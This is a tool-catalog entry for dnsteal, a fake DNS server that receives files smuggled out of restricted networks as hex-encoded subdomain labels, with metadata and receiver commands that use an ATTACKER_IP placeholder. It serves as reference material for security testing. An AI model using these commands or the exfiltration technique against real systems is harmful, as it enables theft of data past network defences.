---
name: "dnsteal"
categories:
  - blackarch-networking
version: "28.1b09d21"
homepage: "https://github.com/m57/dnsteal"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: GPL2
meta-checked: "2026-11-09"
github-repo: "m57/dnsteal"
github-stars: 1731
github-pushed: "2022-02-03"
github-archived: false
github-issues: 5
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# dnsteal

> Fake DNS server that exfiltrates files from a host one subdomain label at a time.

## What it's for

dnsteal (m57) runs on your server masquerading as a DNS server; on the restricted host you encode a file as hex chunks embedded in DNS query names using only standard tools (xxd, cut, dig/host), and dnsteal reassembles the chunks back into the file. Because the data rides inside ordinary-looking lookups, it passes networks where only DNS egress is allowed. It supports gzip-compressed transfers and multiple files, and lets you tune bytes per subdomain, subdomains per query, and filename length within DNS's 63-byte label and 253-byte name limits. It is purely a receiver — the victim-side commands are generated and printed by the tool itself at startup.

## Typical use cases

### Run the default receiver

```
sudo dnsteal ATTACKER_IP -z -v
```

Outcome: listens on UDP 53 at ATTACKER_IP and immediately prints ready-to-paste victim commands (xxd/gzip pipelines tuned to the current settings); every incoming chunk is logged with -v, and with -z received transfers are gunzipped and reassembled to files in the working directory. For a local trial, use 127.0.0.1 as the listen address.

### Tune chunk geometry for throughput

```
sudo dnsteal ATTACKER_IP -z -v -b 45 -s 4 -f 15
```

Outcome: accepts 45 bytes per subdomain across 4 data subdomains per query with 15 bytes reserved for the filename (defaults: 57/4/17); the printed victim commands are regenerated to match, so re-copy them after changing -b/-s/-f. The ceiling is -b 63 -s 4 -f 0 — maximum bandwidth with no in-band filename.

*No corpus evidence — derived from upstream documentation.*
